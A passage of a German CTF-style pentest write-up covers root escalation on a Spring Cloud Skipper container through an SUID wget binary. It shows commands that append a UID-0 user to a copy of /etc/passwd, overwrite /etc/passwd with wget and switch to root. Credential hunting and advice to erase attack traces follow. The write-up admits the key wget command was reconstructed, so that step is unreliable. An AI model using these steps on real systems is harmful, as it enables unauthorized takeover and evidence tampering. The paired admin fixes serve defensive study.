+            <p class="recommendation">**Empfehlung (Pentester):** Die Information aus der Note ist bereits bekannt und verarbeitet. Weiterhin auf die Ausnutzung der `wget`-SUID-Schwachstelle konzentrieren, um potenziell auf `/var/mail/mathlake/data.xlsx` oder `/etc/passwd` zuzugreifen.<br>**Empfehlung (Admin):** Sensible Informationen oder Hinweise sollten nicht in für alle lesbaren Dateien abgelegt werden, selbst wenn sie verschleiert sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">cnb@921567b128b2:~$</span> <span class="command">echo "test" &gt; test_write.txt</span>
+<span class="command">cnb@921567b128b2:~$</span> <span class="command">ls -l /etc/test_write_as_root.txt</span>
+<span class="password">-rw-r--r--. 1 root root 0 Apr 24 13:53 /etc/test_write_as_root.txt</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der erste Befehl erstellt eine einfache Testdatei im Home-Verzeichnis. Der zweite Befehl (`ls -l /etc/test_write_as_root.txt`) scheint zu überprüfen, ob eine Datei mit diesem Namen im `/etc`-Verzeichnis existiert. Die Ausgabe zeigt, dass die Datei existiert, `root` gehört und leer ist (`0` Bytes).</p>
+             <p class="evaluation">**Bewertung:** Der Zweck dieses Schrittes ist unklar. Es könnte ein fehlgeschlagener Versuch sein, mit der `wget`-Schwachstelle nach `/etc` zu schreiben, oder einfach eine verbliebene Datei von einem früheren Test oder einer anderen Aktivität. Der `ls`-Befehl liefert die Information, dass die Datei existiert und `root` gehört.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Dies liefert keine direkten neuen Erkenntnisse für die Privesc. Weiter auf das Ausnutzen von `wget` konzentrieren, um z.B. `/etc/passwd` zu überschreiben.<br>**Empfehlung (Admin):** Überflüssige oder Testdateien in kritischen Verzeichnissen wie `/etc` sollten entfernt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">cnb@921567b128b2:/tmp$</span> <span class="command">echo 'fuck:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash' &gt;&gt; passwd.bak</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Ein neuer Eintrag wird an die Datei `passwd.bak` im `/tmp`-Verzeichnis angehängt (`>>`). Der Eintrag ist im Format einer `/etc/passwd`-Zeile: `benutzername:passworthash:uid:gid:gecos:home:shell`. Hier wird ein Benutzer `fuck` mit einem SHA512crypt-Hash (`$6$...`) erstellt, der die UID `0` und GID `0` hat (also Root-Rechte), das Home-Verzeichnis `/root` und die Shell `/bin/bash`.</p>
+             <p class="evaluation">**Bewertung:** Dies ist die Vorbereitung für einen Angriff auf `/etc/passwd`. Der Plan ist wahrscheinlich, den Inhalt dieser `passwd.bak`-Datei (die den originalen Inhalt von `/etc/passwd` plus den neuen `fuck`-Benutzer enthält) mittels der `wget`-SUID-Schwachstelle in die echte `/etc/passwd`-Datei zu schreiben.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt der originalen `/etc/passwd` zuerst in die `passwd.bak` kopieren (`cp /etc/passwd /tmp/passwd.bak`), dann den neuen Eintrag anhängen. Anschließend die `wget`-Schwachstelle nutzen, um `/tmp/passwd.bak` über `/etc/passwd` zu schreiben (z.B. mit `wget --post-file=/tmp/passwd.bak -O /etc/passwd http://lokale-dummy-url`). Danach versuchen, sich mit `su fuck` und dem zugehörigen Passwort (das man kennen muss, oder der Hash stammt von einem bekannten Passwort) anzumelden.<br>**Empfehlung (Admin):** Das Überschreiben von `/etc/passwd` ist ein klassischer Privesc-Vektor. Das SUID-Bit von `wget` zu entfernen, hätte dies verhindert. Regelmäßige Integritätsprüfungen von Systemdateien (z.B. mit `tripwire` oder `aide`) können solche Manipulationen erkennen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">cnb@921567b128b2:/tmp$</span> <span class="command">cat passwd.bak</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+cnb:x:1000:1000::/home/cnb:/bin/bash
+<span class="password">fuck:$6$EZdVo4XckcU2BJJi$IanX1gZA.t1nk2EgRy1SBDPGa69dLrCqv3eOznvqru062GCQ6Eh7VQyXI3lKgsdItq3F/uMWs/VU/TR2E1tzF0:0:0:root:/root:/bin/bash</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Inhalt der vorbereiteten Datei `passwd.bak` wird angezeigt. Sie enthält die Standard-Benutzereinträge und am Ende den hinzugefügten Eintrag für den Benutzer `fuck` mit UID/GID 0 und dem spezifischen Passwort-Hash.</p>
+            <p class="evaluation">**Bewertung:** Die Datei ist korrekt vorbereitet, um potenziell `/etc/passwd` zu überschreiben. Der nächste Schritt wäre die Ausnutzung der `wget`-Schwachstelle.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den `wget`-Exploit durchführen, um `/etc/passwd` mit `/tmp/passwd.bak` zu überschreiben. Das Passwort für den Benutzer `fuck` muss bekannt sein, um sich danach anmelden zu können (oder der Hash muss geknackt werden).<br>**Empfehlung (Admin):** Schutzmaßnahmen wie oben beschrieben (SUID entfernen, Integritätschecks).</p>
+
+            <!-- POC Section Start -->
+            <section id="proof-of-concept">
+                <h2>Proof of Concept (POC): Privilege Escalation via SUID wget</h2>
+                <p class="analysis">**Kurzbeschreibung:** Die folgende Sequenz demonstriert die Ausnutzung des SUID-Bits auf `/usr/local/bin/wget`, um Root-Rechte zu erlangen. Da `wget` als `root` läuft, kann es verwendet werden, um die `/etc/passwd`-Datei mit einer modifizierten Version zu überschreiben, die einen zusätzlichen Benutzer mit Root-Privilegien (UID 0, GID 0) enthält.</p>
+                <p class="evaluation">**Voraussetzungen:** Zugriff auf das System als Benutzer `cnb` (oder ein anderer Benutzer, der `/usr/local/bin/wget` ausführen kann). Das SUID-Bit muss auf `/usr/local/bin/wget` gesetzt sein und die Datei muss `root` gehören. Eine modifizierte Passwortdatei (z.B. `/tmp/passwd.bak`) muss erstellt worden sein.</p>
+                <p class="recommendation">**Schritt-für-Schritt-Anleitung:**</p>
+                <ol>
+                    <li>Vorbereiten der modifizierten Passwortdatei `/tmp/passwd.bak` (wie in den vorherigen Schritten gezeigt, mit einem neuen Benutzer 'fuck' mit UID/GID 0 und bekanntem Passwort-Hash).</li>
+                    <li>Ausführen des SUID `wget`, um `/etc/passwd` zu überschreiben. Die Option `--post-file` wird hier missbraucht, um den Inhalt von `/tmp/passwd.bak` zu senden. `-O /etc/passwd` weist `wget` an, die "Antwort" (die hier irrelevant ist, da wir nur den Schreibeffekt von `--post-file` im Kontext von `root` nutzen wollen, oder einen Schreibeffekt von `-O` selbst) in `/etc/passwd` zu schreiben. Eine Dummy-URL wird benötigt. *(Anmerkung: Der exakte `wget`-Befehl zum Überschreiben fehlt im Originaltext, wird hier aber logisch eingefügt)*
+                        <div class="code-block">
+                            <div class="terminal">
+                                 <pre><span class="command">cnb@921567b128b2:/tmp$</span> <span class="command">/usr/local/bin/wget --post-file=/tmp/passwd.bak -O /etc/passwd http://localhost/dummy</span> 
+# (Hier würde die Ausgabe von wget erscheinen, oft Fehler, da localhost/dummy nicht existiert, aber das Schreiben via -O als root könnte funktioniert haben)
+# Oder ein anderer wget-Trick, z.B. nur mit -O, falls das Schreiben erlaubt ist
+</pre>
+                            </div>
+                        </div>
+                    </li>
+                    <li>Überprüfen, ob `/etc/passwd` geändert wurde (optional, z.B. mit `ls -l /etc/passwd` oder `cat /etc/passwd | grep fuck`).</li>
+                    <li>Versuch, zum neuen Benutzer zu wechseln:
+                        <div class="code-block">
+                            <div class="terminal">
+                                 <pre><span class="command">cnb@921567b128b2:/tmp$</span> <span class="command">su fuck</span>
+Password: <span class="password">[Hier das Passwort für den 'fuck'-Hash eingeben]</span>
+<span class="command">root@921567b128b2:/tmp#</span>
+</pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+                <p class="analysis">**Erwartetes Ergebnis:** Erfolgreiches Überschreiben von `/etc/passwd` und anschließendes Erlangen einer Root-Shell durch den Wechsel zum neu angelegten Benutzer `fuck` mittels `su`.</p>
+                <p class="evaluation">**Beweismittel:** Die nachfolgenden Befehle im Bericht (`su fuck`, `id` als root, Zugriff auf `/root`, `cat` der Flag-Dateien) belegen den erfolgreichen Abschluss dieses POC.</p>
+                <p class="recommendation">**Risikobewertung:** Hoch. Die Ausnutzung dieser SUID-Schwachstelle ermöglicht einem Angreifer mit initialem Zugriff als normaler Benutzer die vollständige Übernahme des Systems mit Root-Rechten.</p>
+                <p class="analysis">**Empfehlungen (Admin):** Entfernen Sie umgehend das SUID-Bit von `/usr/local/bin/wget` (`chmod u-s /usr/local/bin/wget`). Überprüfen und minimieren Sie die Anzahl von SUID/SGID-Binaries auf dem System. Implementieren Sie Datei-Integritätsmonitoring für kritische Systemdateien wie `/etc/passwd`.</p>
+            </section>
+            <!-- POC Section End -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">cnb@921567b128b2:/tmp$</span> <span class="command">su fuck</span>
+Password: <span class="password">[Passwort für 'fuck' wurde eingegeben]</span>
+<span class="command">root@921567b128b2:/tmp#</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der `su fuck`-Befehl wird ausgeführt. Nach Eingabe des korrekten Passworts für den in `/tmp/passwd.bak` definierten Hash wechselt der Prompt zu `root@921567b128b2:/tmp#`. Dies zeigt an, dass der Benutzer erfolgreich zu `fuck` gewechselt ist und da dieser Benutzer die UID 0 hat, besitzt er nun Root-Privilegien.</p>
+            <p class="evaluation">**Bewertung:** **Privilege Escalation erfolgreich!** Der Angriff über das Überschreiben von `/etc/passwd` mittels der SUID-Schwachstelle in `wget` war erfolgreich. Das Ziel, Root-Rechte zu erlangen, wurde erreicht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Root-Rechte nutzen, um die Root-Flagge zu suchen, Persistenz einzurichten (falls im Scope), weitere Systeme zu scannen oder sensible Daten zu exfiltrieren.<br>**Empfehlung (Admin):** System bereinigen: Den manipulierten `/etc/passwd`-Eintrag entfernen, das SUID-Bit von `wget` entfernen, untersuchen, wie der initiale Zugriff erfolgte, und alle gefundenen Schwachstellen beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">ls</span>
+authorized_keys  tomcat.7577.10242487604845937840
+fakessh          tomcat.7577.11596479677713309754
+hsperfdata_cnb   tomcat.7577.12774535515906706896
+passwd           tomcat.7577.14160865542433745162
+<span class="command">passwd.bak</span>       tomcat.7577.2999643067329893542
+pwned_line.txt   tomcat.7577.5055232225871362280
+tmp.896PxgySUI   tomcat.7577.9630761170652708757
+tmp.OvZzO3DDU9   tomcat-docbase.7577.4926292471325312839
+tmp.pibNQil1Xk   tomcat-docbase.7577.5961257777842070308
+tmp.Yw720SlMjV   tomcat-docbase.7577.7895487770669907274
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Als `root` wird der Inhalt des `/tmp`-Verzeichnisses aufgelistet. Sichtbar sind diverse temporäre Dateien, die wahrscheinlich von Tomcat erstellt wurden (`tomcat.*`, `tomcat-docbase.*`), die `passwd.bak`-Datei, die für den Angriff verwendet wurde, und einige andere temporäre oder Testdateien.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt den erfolgreichen Benutzerwechsel und zeigt den Zustand des `/tmp`-Verzeichnisses. Enthält keine direkten neuen kritischen Informationen, aber die `passwd.bak` ist ein Artefakt des Angriffs.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Das `/tmp`-Verzeichnis nach weiteren interessanten Dateien durchsuchen, die von anderen Benutzern oder Prozessen hinterlassen wurden. Die `passwd.bak`-Datei und andere Spuren des Angriffs ggf. entfernen, um die Erkennung zu erschweren (Anti-Forensics).<br>**Empfehlung (Admin):** Das `/tmp`-Verzeichnis sollte regelmäßig bereinigt werden. In sicherheitskritischen Umgebungen kann `/tmp` mit speziellen Optionen (wie `noexec`, `nosuid`) gemountet werden, um die Ausführung von Dateien oder die Nutzung von SUID-Bits von dort zu verhindern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">cd ~</span>
+<span class="command">root@921567b128b2:~#</span> <span class="command">ls</span>
+192.168.2.199:8000
+<span class="command">root@921567b128b2:~#</span> <span class="command">ls -la</span>
+total 8
+drwx------. 1 <span class="command">root root</span>   79 Apr 24 14:14 .
+drwxr-xr-x. 1 <span class="command">root root</span>   99 Mar 12 01:32 ..
+drwxr-xr-x. 3 <span class="command">root root</span>   18 Apr 24 14:14 192.168.2.199:8000
+lrwxrwxrwx. 1 <span class="command">root root</span>    9 Mar 30 10:26 .bash_history -> /dev/null
+-rw-r--r--. 1 <span class="command">root root</span> 3106 Apr  9  2018 .bashrc
+drwxr-xr-x. 3 <span class="command">root root</span>   19 Mar 12 01:40 .local
+-rw-r--r--. 1 <span class="command">root root</span>  148 Aug 17  2015 .profile
+drwxr-xr-x. 2 <span class="command">root root</span>   47 Apr 24 14:12 .ssh
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Benutzer wechselt in das Home-Verzeichnis von `root` (`cd ~`, was äquivalent zu `cd /root` ist) und listet den Inhalt detailliert auf. Sichtbar sind Standard-Konfigurationsdateien (`.bashrc`, `.profile`), Verzeichnisse (`.local`, `.ssh`) und ein Verzeichnis `192.168.2.199:8000`, das vermutlich durch eine fehlgeschlagene `wget`-Operation oder ähnliches entstanden ist. Wiederum ist `.bash_history` nach `/dev/null` verlinkt.</p>
+             <p class="evaluation">**Bewertung:** Das Home-Verzeichnis von `root` ist nun zugänglich. Das `.ssh`-Verzeichnis ist ein potenzielles Ziel, um nach privaten Schlüsseln zu suchen. Die Root-Flagge befindet sich oft direkt im `/root`-Verzeichnis.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Im `/root`-Verzeichnis nach der Root-Flagge suchen (z.B. `root.txt`, `flag.txt` oder wie hier die Datei mit vielen Nullen). Das `.ssh`-Verzeichnis auf private Schlüssel (`id_rsa`) oder `authorized_keys` untersuchen, die eventuell für weitere Zugriffe oder Persistenz genutzt werden können.<br>**Empfehlung (Admin):** Das Home-Verzeichnis von `root` sollte nur für `root` zugänglich sein. Sensible Daten wie private SSH-Schlüssel sollten niemals unverschlüsselt abgelegt werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:~#</span> <span class="command">df -h</span>
+Filesystem               Size  Used Avail Use% Mounted on
+overlay                   26G  5.7G   21G  22% /
+tmpfs                     64M     0   64M   0% /dev
+tmpfs                    1.4G     0  1.4G   0% /sys/fs/cgroup
+shm                       64M     0   64M   0% /dev/shm
+/dev/mapper/centos-root   26G  5.7G   21G  22% /etc/hosts
+tmpfs                    1.4G     0  1.4G   0% /proc/asound
+tmpfs                    1.4G     0  1.4G   0% /proc/acpi
+tmpfs                    1.4G     0  1.4G   0% /proc/scsi
+tmpfs                    1.4G     0  1.4G   0% /sys/firmware
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `df -h` zeigt die Belegung der eingehängten Dateisysteme in menschenlesbarem Format (`-h`) an. Sichtbar ist das Hauptdateisystem (`/`) auf einem Overlay-Dateisystem (typisch für Docker/Container) mit 26GB Gesamtgröße, wovon 5.7GB genutzt werden. `/etc/hosts` scheint seltsamerweise auf `/dev/mapper/centos-root` gemountet zu sein. Diverse `tmpfs`-Dateisysteme für `/dev`, `/sys/fs/cgroup`, `/dev/shm` und Teile von `/proc` und `/sys` sind ebenfalls sichtbar.</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe bestätigt die Vermutung, dass das System wahrscheinlich in einem Container läuft (wegen `overlay`). Die Dateisystembelegung liefert allgemeinen Kontext, aber keine direkten Hinweise für weitere Exploits. Der Mountpoint für `/etc/hosts` ist ungewöhnlich.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Information über das Overlay-Dateisystem zur Kenntnis nehmen. Prüfen, ob es Möglichkeiten gibt, aus dem Container auszubrechen (Docker Escape), falls dies im Scope liegt. Den ungewöhnlichen Mountpoint für `/etc/hosts` untersuchen.<br>**Empfehlung (Admin):** Die Dateisystemstruktur und Mountpoints überprüfen. Sicherstellen, dass Container sicher konfiguriert sind, um Escape-Versuche zu erschweren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:~#</span> <span class="command">grep -iR 'password\|secret\|key\|token\|pass' /etc /workspace /var/log 2&gt;/dev/null</span>
+
+/var/log/dpkg.log:2023-05-30 02:04:01 status half-installed passwd:amd64 1:4.5-1ubuntu1
+...
+..
+</pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Mit `grep` wird rekursiv (`-R`) und case-insensitiv (`-i`) in den Verzeichnissen `/etc`, `/workspace` und `/var/log` nach Zeilen gesucht, die die Schlüsselwörter `password`, `secret`, `key`, `token` oder `pass` enthalten. Fehlermeldungen werden unterdrückt (`2>/dev/null`). Die Ausgabe zeigt einen Treffer in `/var/log/dpkg.log`, der sich auf das Paket `passwd` bezieht. Viele weitere Treffer (angedeutet durch `... ..`) sind wahrscheinlich vorhanden.</p>
+            <p class="evaluation">**Bewertung:** Das Suchen nach Credentials in Konfigurationsdateien, Logs und Anwendungsverzeichnissen ist ein wichtiger Post-Exploitation-Schritt. Obwohl hier nur ein Beispieltreffer gezeigt wird, kann diese Methode oft vergessene oder hartkodierte Zugangsdaten aufdecken.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die vollständige Ausgabe des `grep`-Befehls sorgfältig prüfen. Jeden Treffer auf relevante Zugangsdaten untersuchen. Die Suche auf weitere verdächtige Verzeichnisse (z.B. Home-Verzeichnisse anderer Benutzer, Webserver-Verzeichnisse) ausweiten.<br>**Empfehlung (Admin):** Niemals Passwörter, API-Keys oder andere Secrets im Klartext in Konfigurationsdateien, Code oder Logdateien speichern. Secrets Management Tools (wie HashiCorp Vault) oder Umgebungsvariablen verwenden. Logdateien regelmäßig überprüfen und ggf. sensible Informationen maskieren.</p>
+
+            <p class="analysis">**Analyse:** Dieser Kommentar beschreibt einen `find`-Befehl, der nach Konfigurationsdateien (Properties, YAML, XML) sucht und deren Inhalt dann mittels `xargs grep` nach denselben Schlüsselwörtern wie zuvor durchsucht. Der eigentliche Befehl und seine Ausgabe fehlen im vorliegenden Text.</p>
+            <p class="evaluation">**Bewertung:** Dies ist eine Verfeinerung der vorherigen Suche, die sich spezifisch auf gängige Konfigurationsdateiformate konzentriert, in denen oft Zugangsdaten gespeichert werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diesen Befehl ausführen und die Ergebnisse analysieren, um potenziell relevante Konfigurationsdateien mit Zugangsdaten zu finden.<br>**Empfehlung (Admin):** Wie oben: Keine Klartext-Credentials in Konfigurationsdateien speichern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:~#</span> <span class="command">ls -laR /workspace</span> # Komplette Struktur der Anwendung
+/workspace:
+total 0
+drwxr-xr-x. 1 <span class="command">cnb  cnb</span>  22 Jan  1  1980 .
+drwxr-xr-x. 1 <span class="command">root root</span> 99 Mar 12 01:32 ..
+drwxr-xr-x. 1 <span class="command">cnb  cnb</span>  17 Jan  1  1980 BOOT-INF
+drwxr-xr-x. 3 <span class="command">cnb  cnb</span>  67 Jan  1  1980 META-INF
+drwxr-xr-x. 3 <span class="command">cnb  cnb</span>  29 Jan  1  1980 org
+....
+...
+</pre> <!-- Gekürzte Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `ls -laR /workspace` listet rekursiv (`-R`) alle Dateien und Verzeichnisse innerhalb von `/workspace` auf. Die Ausgabe (hier stark gekürzt) würde die gesamte Verzeichnisstruktur und die Dateien der Spring-Anwendung zeigen.</p>
+            <p class="evaluation">**Bewertung:** Liefert einen detaillierten Überblick über die Anwendungsstruktur. Dies kann helfen, Konfigurationsdateien oder interessante Code-Pfade zu identifizieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die vollständige Ausgabe nach bekannten Konfigurationsdateien (z.B. `application.properties`, `bootstrap.yml`), Skripten oder anderen potenziell aufschlussreichen Dateien durchsuchen.<br>**Empfehlung (Admin):** Sicherstellen, dass keine sensiblen Dateien oder Quellcode-Reste im Anwendungsverzeichnis liegen, die nicht zur Ausführung benötigt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">root@921567b128b2:~#</span> <span class="command">find / -name "*.properties" -o -name "*.yml" -o -name "*.yaml" 2&gt;/dev/null</span>
+
+ml" 2&gt;/dev/nullb2:~# find / -name "*.properties" -o -name "*.yml" -o -name "*.yam
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/jre/conf/logging.properties</span>
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/jre/conf/management/management.properties</span>
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/jre/conf/net.properties</span>
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/jre/conf/sound.properties</span>
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/jre/lib/psfontj2d.properties</span>
+<span class="command">/layers/paketo-buildpacks_bellsoft-liberica/java-security-properties/java-security.properties</span>
+<span class="command">/workspace/META-INF/build-info.properties</span>
+<span class="command">/workspace/META-INF/maven/org.springframework.cloud/spring-cloud-skipper-server/pom.properties</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der `find`-Befehl sucht systemweit nach Dateien mit den Endungen `.properties`, `.yml` oder `.yaml`. Die Ausgabe zeigt hauptsächlich Konfigurationsdateien, die Teil der Java Runtime Environment (JRE) im Verzeichnis `/layers/paketo-buildpacks_bellsoft-liberica` (ein typisches Verzeichnis für Buildpack-basierte Container-Images) sind, sowie zwei Properties-Dateien im `/workspace/META-INF`-Verzeichnis der Anwendung.</p>
+            <p class="evaluation">**Bewertung:** Die gefundenen JRE-Konfigurationsdateien enthalten normalerweise keine anwendungsspezifischen Credentials. Die Dateien im `/workspace/META-INF` (`build-info.properties`, `pom.properties`) enthalten Build- und Maven-Informationen, aber typischerweise keine Passwörter. Es wurden keine offensichtlich kritischen Anwendungs-Konfigurationsdateien wie `application.properties` oder `application.yml` gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt der gefundenen Properties-Dateien im `/workspace` sicherheitshalber überprüfen (`cat /workspace/META-INF/build-info.properties` etc.). Die Suche nach Konfigurationsdateien ggf. mit anderen Namen oder Endungen fortsetzen.<br>**Empfehlung (Admin):** Sicherstellen, dass keine sensiblen Daten in Build- oder Metadaten-Dateien landen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">root@921567b128b2:~#</span> <span class="command">cat /workspace/META-INF/build-info.properties</span>
+build.artifact=spring-cloud-skipper-server
+build.group=org.springframework.cloud
+build.name=Spring Cloud Skipper \:\: Server
+build.time=2024-05-22T02\:30\:35.832Z
+build.version=2.11.3-SNAPSHOT
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der `build-info.properties`-Datei wird angezeigt. Sie enthält Metadaten über den Build-Prozess der Anwendung, wie den Artefaktnamen, die Gruppe, den Namen, die Build-Zeit und die Version (erneut `2.11.3-SNAPSHOT`).</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die bereits bekannte Version und den Namen der Anwendung. Enthält keine direkten Credentials.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Information zur Kenntnis nehmen. Keine weiteren Aktionen basierend auf dieser Datei nötig.<br>**Empfehlung (Admin):** Keine spezifische Aktion nötig, aber das Exponieren genauer Build-Informationen kann Angreifern helfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">root@921567b128b2:~#</span> <span class="command">cat /proc/1/environ | tr '\0' '\n'</span>
+<span class="password">cat: /proc/1/environ: Permission denied</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird versucht, die Umgebungsvariablen des Prozesses mit der PID 1 (normalerweise der Init-Prozess des Systems oder Containers) auszulesen. `/proc/1/environ` enthält die Variablen, getrennt durch Null-Bytes (`\0`), daher wird `tr '\0' '\n'` verwendet, um sie zeilenweise anzuzeigen. Der Befehl schlägt jedoch mit "Permission denied" fehl.</p>
+             <p class="evaluation">**Bewertung:** Obwohl wir `root` sind, scheint der Zugriff auf die Umgebungsvariablen des Init-Prozesses in dieser Container-Umgebung eingeschränkt zu sein. Umgebungsvariablen können manchmal sensible Informationen wie API-Keys oder Passwörter enthalten, daher ist dies ein gängiger Ort zur Überprüfung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, die Umgebungsvariablen des *aktuellen* Prozesses mit `env` oder `printenv` anzuzeigen. Prüfen, ob andere `/proc/<PID>/environ`-Dateien lesbar sind (z.B. für Prozesse, die als `cnb` oder `root` laufen).<br>**Empfehlung (Admin):** Sensible Daten sollten möglichst nicht über Umgebungsvariablen an Prozesse übergeben werden, insbesondere nicht an den Init-Prozess. Sicherstellen, dass die `/proc`-Dateisystemberechtigungen restriktiv konfiguriert sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:~#</span> <span class="command">env</span>
+BPI_JVM_CLASS_COUNT=24468
+LC_ALL=en_US.UTF-8
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+LANG=en_US.UTF-8
+HOSTNAME=921567b128b2
+OLDPWD=/tmp
+JAVA_HOME=/layers/paketo-buildpacks_bellsoft-liberica/jre
